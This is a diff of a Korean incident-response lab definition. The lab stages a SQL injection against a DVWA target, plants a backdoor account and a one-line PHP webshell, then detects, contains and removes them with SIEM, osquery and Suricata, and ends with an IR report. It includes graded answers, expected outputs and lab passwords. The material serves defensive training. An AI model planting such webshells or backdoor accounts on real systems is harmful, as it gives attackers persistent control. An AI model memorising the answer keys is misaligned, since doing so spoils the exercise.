@@ -9,10 +9,11 @@ description: |
   본 실습은 그 판정을 근거로 인프라에 실제로 손을 대어 피해를 멈추는 대응이다. 통제된 한 침해
   (SQLi 침투 + 백도어 계정 socw9bd + 웹쉘 /tmp/socw9_shell.php)를 재현하고, SIEM(alerts.json)·
   osquery로 범위/심각도를 식별하고, Suricata 격리 룰(alert, sid 9509001)로 공격 출발지
-  (10.20.30.202)를 플래그하고, osquery로 발판을 빠짐없이 제거하고, 서비스 정상성과 발판 잔재 0을
+  (192.168.0.202)를 플래그하고, osquery로 발판을 빠짐없이 제거하고, 서비스 정상성과 발판 잔재 0을
   검증하고, 타임라인/근본원인/재발방지를 정리해 IR 보고서로 종합한다. 격리 룰과 재현 발판은
-  시연 후 self-clean으로 원복해 공유 인프라를 보존한다. 모든 명령은 el34 호스트
-  (`ssh ccc@{{TARGET_IP}}`, 비밀번호 1)에서 docker exec로 수행한다.
+  시연 후 self-clean으로 원복해 공유 인프라를 보존한다. 사고를 유발하는 공격(재현)은 내 공격 VM
+  `ssh att@192.168.0.202`(비번 1)에서 보내고(공격 출발지 192.168.0.202), IR 대응(식별·격리·제거)은
+  el34 호스트(`ssh ccc@{{TARGET_IP}}`, 비번 1)에서 docker exec로 수행한다.
 difficulty: hard
 duration_minutes: 200
 prerequisites:
@@ -89,12 +90,12 @@ steps:
       이 두 발판이 격리·제거가 끊어낼 표적이다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** 침투는 `el34-attacker`, 발판 심기는 `el34-web`.
+      **실습 컨테이너:** 침투는 `외부 공격자 VM 192.168.0.202`, 발판 심기는 `el34-web`.
       각 컨테이너에 `docker exec -it el34-<name> bash` 로 접속해 실행한다.
 
       ```bash
-      # ── el34-attacker 에서: 침투 — sqlmap UA SQLi 주입 ──
-      curl -s -o /dev/null -A sqlmap/1.7 -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=socw9%27%20UNION%20SELECT%201--%20-"
+      # ── 외부 공격자 VM 192.168.0.202 에서: 침투 — sqlmap UA SQLi 주입 ──
+      curl -s -o /dev/null -A sqlmap/1.7 -H 'Host: dvwa.el34.lab' "http://192.168.0.161/?id=socw9%27%20UNION%20SELECT%201--%20-"
       # ── el34-web 에서: 지속성 발판 — 백도어 계정 socw9bd + 웹쉘 작성 ──
       userdel -r socw9bd 2>/dev/null; useradd -m -s /bin/bash socw9bd; echo "<?php system(\$_GET[c]); ?>" > /tmp/socw9_shell.php; echo planted
       # 로그 수렴 대기 후 완료 마커
@@ -112,7 +113,7 @@ steps:
     points: 10
     answer: |
       # 1) 침투 — sqlmap UA로 SQLi 주입(웹/네트워크 로그에 공격 흔적)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -A sqlmap/1.7 -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=socw9%27%20UNION%20SELECT%201--%20-\""
+      ssh att@192.168.0.202 "curl -s -o /dev/null -A sqlmap/1.7 -H 'Host: dvwa.el34.lab' \"http://192.168.0.161/?id=socw9%27%20UNION%20SELECT%201--%20-\""
       # 2) 지속성 발판 — 백도어 계정 socw9bd 생성 + 웹쉘 /tmp/socw9_shell.php 작성
       docker exec el34-web sh -c 'userdel -r socw9bd 2>/dev/null; useradd -m -s /bin/bash socw9bd; echo "<?php system(\$_GET[c]); ?>" > /tmp/socw9_shell.php; echo planted'
       # 3) 로그 수렴 대기 후 완료 마커
@@ -145,40 +146,40 @@ steps:
       각 컨테이너에 `docker exec -it el34-<name> bash` 로 접속해 실행한다.
 
       ```bash
-      # ── el34-siem 에서: Identify — 출발지 10.20.30.202 경보 시간순(타임라인) ──
-      tail -1000 /var/ossec/logs/alerts/alerts.json | jq -rc 'select(.data.src_ip=="10.20.30.202")|[.timestamp,.rule.description]|@tsv' | tail -5
+      # ── el34-siem 에서: Identify — 출발지 192.168.0.202 경보 시간순(타임라인) ──
+      tail -1000 /var/ossec/logs/alerts/alerts.json | jq -rc 'select(.data.src_ip=="192.168.0.202")|[.timestamp,.rule.description]|@tsv' | tail -5
       # ── el34-web 에서: Identify — osquery로 백도어 계정(socw9bd) 발판 존재 확인 ──
       osqueryi --json 'SELECT username,uid FROM users WHERE username="socw9bd";'
-      # 해석 — 범위: 출발지 10.20.30.202·web 침투·백도어 발판, 심각도: 침투 성공(P1)
-      echo "→ 범위: 출발지 10.20.30.202, web 호스트 침투, 백도어 계정 발판. 심각도: 침투 성공(P1)"
+      # 해석 — 범위: 출발지 192.168.0.202·web 침투·백도어 발판, 심각도: 침투 성공(P1)
+      echo "→ 범위: 출발지 192.168.0.202, web 호스트 침투, 백도어 계정 발판. 심각도: 침투 성공(P1)"
       ```
       ## ✅ 합격 기준
-      `socw9bd` 출력 시 통과. **근거:** SIEM 경보로 출발지(10.20.30.202)·타임라인이 보이고 osquery 가
+      `socw9bd` 출력 시 통과. **근거:** SIEM 경보로 출발지(192.168.0.202)·타임라인이 보이고 osquery 가
       백도어 계정 socw9bd 를 반환하면 범위(web 침투 + 백도어 발판)와 심각도(침투 성공 = P1)가 확정된다.
       ## 🔧 도구 풀이
-      - `alerts.json` + `jq select(.data.src_ip==10.20.30.202)` — 출발지로 묶은 시간순 타임라인. el34 fw 가 SNAT 안 해 출처 IP 보존(W08 §3).
+      - `alerts.json` + `jq select(.data.src_ip==192.168.0.202)` — 출발지로 묶은 시간순 타임라인. el34 fw 가 SNAT 안 해 출처 IP 보존(W08 §3).
       - `osqueryi --json 'SELECT ... FROM users WHERE ...'` — 호스트 계정 조회. 백도어 계정 반환 = 침해(P1)의 결정적 증거.
     hint: 'alerts.json 출발지 + osquery 발판'
     category: analysis
     points: 12
     answer: |
-      # 1) Identify — SIEM에서 출발지 10.20.30.202 경보를 시간순(타임라인)으로
-      docker exec el34-siem sh -c 'tail -1000 /var/ossec/logs/alerts/alerts.json | jq -rc "select(.data.src_ip==\"10.20.30.202\")|[.timestamp,.rule.description]|@tsv" | tail -5'
+      # 1) Identify — SIEM에서 출발지 192.168.0.202 경보를 시간순(타임라인)으로
+      docker exec el34-siem sh -c 'tail -1000 /var/ossec/logs/alerts/alerts.json | jq -rc "select(.data.src_ip==\"192.168.0.202\")|[.timestamp,.rule.description]|@tsv" | tail -5'
       # 2) Identify — osquery로 백도어 계정(socw9bd) 발판 존재 확인
       docker exec el34-web osqueryi --json 'SELECT username,uid FROM users WHERE username="socw9bd";'
-      # 3) 해석 — 범위: 출발지 10.20.30.202·web 침투·백도어 발판, 심각도: 침투 성공(P1)
-      echo "→ 범위: 출발지 10.20.30.202, web 호스트 침투, 백도어 계정 발판. 심각도: 침투 성공(P1)"
-    answer_detail: "Identify(식별) = 무슨 일이 어디까지 일어났나를 증거로 확정. 두 축 — SIEM alerts.json 으로 출발지(10.20.30.202)·타임라인(시간순 경보)을, osquery 로 호스트에 남은 발판(백도어 계정 socw9bd)을 확인한다. 계정이 존재한다는 것은 공격자가 호스트에 계정을 만들 정도로 뚫렸다는 뜻 → 심각도는 '시도'가 아니라 '침해(P1)'. 이 범위·심각도가 이후 격리·제거의 강도와 범위를 결정한다."
+      # 3) 해석 — 범위: 출발지 192.168.0.202·web 침투·백도어 발판, 심각도: 침투 성공(P1)
+      echo "→ 범위: 출발지 192.168.0.202, web 호스트 침투, 백도어 계정 발판. 심각도: 침투 성공(P1)"
+    answer_detail: "Identify(식별) = 무슨 일이 어디까지 일어났나를 증거로 확정. 두 축 — SIEM alerts.json 으로 출발지(192.168.0.202)·타임라인(시간순 경보)을, osquery 로 호스트에 남은 발판(백도어 계정 socw9bd)을 확인한다. 계정이 존재한다는 것은 공격자가 호스트에 계정을 만들 정도로 뚫렸다는 뜻 → 심각도는 '시도'가 아니라 '침해(P1)'. 이 범위·심각도가 이후 격리·제거의 강도와 범위를 결정한다."
     expected_output: |
-      2026-06-26T14:46:34.598+0000	Suricata: Alert - 6V6 SQL Injection - UNION SELECT
-      2026-06-26T14:46:44.549+0000	Suricata: Alert - 6V6 SQL Injection - UNION SELECT
-      2026-06-26T14:46:44.551+0000	Suricata: Alert - 6V6 Bot UA - sqlmap
-      2026-06-26T14:46:54.552+0000	Suricata: Alert - 6V6 SQL Injection - UNION SELECT
-      2026-06-26T14:46:54.589+0000	Suricata: Alert - 6V6 Bot UA - sqlmap
+      2026-06-26T14:46:34.598+0000	Suricata: Alert - EL34 SQL Injection - UNION SELECT
+      2026-06-26T14:46:44.549+0000	Suricata: Alert - EL34 SQL Injection - UNION SELECT
+      2026-06-26T14:46:44.551+0000	Suricata: Alert - EL34 Bot UA - sqlmap
+      2026-06-26T14:46:54.552+0000	Suricata: Alert - EL34 SQL Injection - UNION SELECT
+      2026-06-26T14:46:54.589+0000	Suricata: Alert - EL34 Bot UA - sqlmap
       [
         {"uid":"1001","username":"socw9bd"}
       ]
-      → 범위: 출발지 10.20.30.202, web 호스트 침투, 백도어 계정 발판. 심각도: 침투 성공(P1)
+      → 범위: 출발지 192.168.0.202, web 호스트 침투, 백도어 계정 발판. 심각도: 침투 성공(P1)
     verify:
       type: output_contains
       expect: 'socw9bd'
@@ -199,18 +200,18 @@ steps:
       끊긴다. 공유 인프라이므로 실제 drop 대신 alert(탐지 플래그)로 시연하고 끝나면 룰을 정리한다.
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** 격리 룰·검증·정리는 `el34-ips`, 테스트 트래픽은 `el34-attacker`.
+      **실습 컨테이너:** 격리 룰·검증·정리는 `el34-ips`, 테스트 트래픽은 `외부 공격자 VM 192.168.0.202`.
       각 컨테이너에 `docker exec -it el34-<name> bash` 로 접속해 실행한다.
 
       ```bash
-      # ── el34-ips 에서: 격리 룰 추가(출발지 10.20.30.202 플래그, sid 9509001) + 즉시 reload ──
+      # ── el34-ips 에서: 격리 룰 추가(출발지 192.168.0.202 플래그, sid 9509001) + 즉시 reload ──
       sudo bash -c "cat >> /etc/suricata/rules/local.rules <<EOF
-      alert ip 10.20.30.202 any -> any any (msg:\"SOC W09 IR contain flag attacker source\"; sid:9509001; rev:1;)
+      alert ip 192.168.0.202 any -> any any (msg:\"SOC W09 IR contain flag attacker source\"; sid:9509001; rev:1;)
       EOF"
       sudo suricatasc -c reload-rules
 
-      # ── el34-attacker 에서: 출발지가 다시 움직이게 유발(테스트 트래픽) ──
-      curl -s -o /dev/null -H "Host: dvwa.el34.lab" http://10.20.30.1/
+      # ── 외부 공격자 VM 192.168.0.202 에서: 출발지가 다시 움직이게 유발(테스트 트래픽) ──
+      curl -s -o /dev/null -H "Host: dvwa.el34.lab" http://192.168.0.161/
 
       # ── el34-ips 에서: 격리 룰 포착 횟수(1+) + self-clean(룰 삭제 + reload) (4초 후) ──
       sudo grep -c 9509001 /var/log/suricata/eve.json
@@ -226,21 +227,21 @@ steps:
     category: manipulation
     points: 14
     answer: |
-      # 1) 격리 룰 추가 — 출발지 10.20.30.202의 모든 트래픽을 플래그(alert, sid 9509001)
+      # 1) 격리 룰 추가 — 출발지 192.168.0.202의 모든 트래픽을 플래그(alert, sid 9509001)
       docker exec el34-ips sh -c 'sudo bash -c "cat >> /etc/suricata/rules/local.rules <<EOF
-      alert ip 10.20.30.202 any -> any any (msg:\"SOC W09 IR contain flag attacker source\"; sid:9509001; rev:1;)
+      alert ip 192.168.0.202 any -> any any (msg:\"SOC W09 IR contain flag attacker source\"; sid:9509001; rev:1;)
       EOF"'
       # 2) 재기동 없이 룰 즉시 반영
       docker exec el34-ips sh -c 'sudo suricatasc -c reload-rules'
       # 3) 출발지가 다시 움직이게 유발(테스트 트래픽)
       sleep 2
-      docker exec el34-attacker sh -c 'curl -s -o /dev/null -H "Host: dvwa.el34.lab" http://10.20.30.1/'
+      ssh att@192.168.0.202 'curl -s -o /dev/null -H "Host: dvwa.el34.lab" http://192.168.0.161/'
       # 4) 격리 룰이 eve.json에 포착된 횟수(1+ = 출발지 트래픽 플래그됨)
       sleep 4
       docker exec el34-ips sh -c 'sudo grep -c 9509001 /var/log/suricata/eve.json'
       # 5) self-clean — 격리 룰 삭제 + reload(공유 인프라 원복)
       docker exec el34-ips sh -c 'sudo sed -i "/sid:9509001/d" /etc/suricata/rules/local.rules; sudo suricatasc -c reload-rules >/dev/null; echo rule_removed'
-    answer_detail: "Contain(격리) = 제거에 걸리는 시간 동안 확산을 막는 방화문. 공격 출발지(10.20.30.202)의 모든 트래픽(ip ... any -> any any)을 플래그하는 Suricata 룰(sid 9509001)을 local.rules 에 추가 → reload-rules 로 즉시 반영 → 출발지가 보낸 트래픽이 eve.json 에 잡히는지 grep 으로 검증 → 시연이 끝나면 sed 로 룰 삭제(self-clean)해 공유 인프라를 원복한다. 운영 환경은 같은 논리를 firewall drop 으로 실제 차단하지만, 공유 실습은 다른 학생 트래픽까지 끊기지 않도록 alert 로 시연만 한다. 핵심 — 격리는 빠르되 정밀해야 한다(범위가 넓으면 정상 서비스도 차단)."
+    answer_detail: "Contain(격리) = 제거에 걸리는 시간 동안 확산을 막는 방화문. 공격 출발지(192.168.0.202)의 모든 트래픽(ip ... any -> any any)을 플래그하는 Suricata 룰(sid 9509001)을 local.rules 에 추가 → reload-rules 로 즉시 반영 → 출발지가 보낸 트래픽이 eve.json 에 잡히는지 grep 으로 검증 → 시연이 끝나면 sed 로 룰 삭제(self-clean)해 공유 인프라를 원복한다. 운영 환경은 같은 논리를 firewall drop 으로 실제 차단하지만, 공유 실습은 다른 학생 트래픽까지 끊기지 않도록 alert 로 시연만 한다. 핵심 — 격리는 빠르되 정밀해야 한다(범위가 넓으면 정상 서비스도 차단)."
     expected_output: |
       {"message": "done", "return": "OK"}
       21
@@ -417,7 +418,7 @@ steps:
       # 1) heredoc(<<'EOF' ... EOF)으로 IR 보고서 출력 — Identify→Contain→Eradicate→Recover→Lessons→결론
       cat <<'EOF'
       # SOC W09 IR 보고서
-      ## 1. Identify: 출발지 10.20.30.202, web SQLi 침투, 백도어 계정 socw9bd+웹쉘 (P1 침해)
+      ## 1. Identify: 출발지 192.168.0.202, web SQLi 침투, 백도어 계정 socw9bd+웹쉘 (P1 침해)
       ## 2. Contain: IDS 격리 룰(9509001) 출발지 플래그 (운영=firewall drop)
       ## 3. Eradicate: userdel socw9bd + rm 웹쉘 (osquery 헌팅)
       ## 4. Recover: 웹 정상 응답 + 발판 잔재 0
@@ -436,17 +437,17 @@ steps:
     answer: |
       cat <<'EOF'
       # SOC W09 IR 보고서
-      ## 1. Identify: 출발지 10.20.30.202, web SQLi 침투, 백도어 계정 socw9bd+웹쉘 (P1 침해)
+      ## 1. Identify: 출발지 192.168.0.202, web SQLi 침투, 백도어 계정 socw9bd+웹쉘 (P1 침해)
       ## 2. Contain: IDS 격리 룰(9509001) 출발지 플래그 (운영=firewall drop)
       ## 3. Eradicate: userdel socw9bd + rm 웹쉘 (osquery 헌팅)
       ## 4. Recover: 웹 정상 응답 + 발판 잔재 0
       ## 5. Lessons: 근본원인 SQLi 취약점, 재발방지 WAF/패치/탐지룰
       ## 결론: IR은 절차 — 식별→격리→제거→복구→교훈. 첫 60분의 행동이 피해를 가른다
       EOF
-    answer_detail: "IR 보고서 = 5단계 종합 산출물. 식별(출발지 10.20.30.202·SQLi 침투·백도어 발판 → P1) → 격리(IDS 룰 9509001 출발지 플래그, 운영은 firewall drop) → 제거(userdel socw9bd + rm 웹쉘, osquery 헌팅) → 복구(웹 정상 + 발판 잔재 0) → 교훈(근본원인 SQLi, 재발방지 WAF/패치/탐지룰)을 한 흐름으로 엮는다. 분석(W01–W08)을 대응(IR)으로 전환한 결과를 절차대로 빠르고 정밀하게 문서화하는 것이 핵심 — 첫 60분의 행동이 피해를 가른다."
+    answer_detail: "IR 보고서 = 5단계 종합 산출물. 식별(출발지 192.168.0.202·SQLi 침투·백도어 발판 → P1) → 격리(IDS 룰 9509001 출발지 플래그, 운영은 firewall drop) → 제거(userdel socw9bd + rm 웹쉘, osquery 헌팅) → 복구(웹 정상 + 발판 잔재 0) → 교훈(근본원인 SQLi, 재발방지 WAF/패치/탐지룰)을 한 흐름으로 엮는다. 분석(W01–W08)을 대응(IR)으로 전환한 결과를 절차대로 빠르고 정밀하게 문서화하는 것이 핵심 — 첫 60분의 행동이 피해를 가른다."
     expected_output: |
       # SOC W09 IR 보고서
-      ## 1. Identify: 출발지 10.20.30.202, web SQLi 침투, 백도어 계정 socw9bd+웹쉘 (P1 침해)
+      ## 1. Identify: 출발지 192.168.0.202, web SQLi 침투, 백도어 계정 socw9bd+웹쉘 (P1 침해)
       ## 2. Contain: IDS 격리 룰(9509001) 출발지 플래그 (운영=firewall drop)
       ## 3. Eradicate: userdel socw9bd + rm 웹쉘 (osquery 헌팅)
       ## 4. Recover: 웹 정상 응답 + 발판 잔재 0
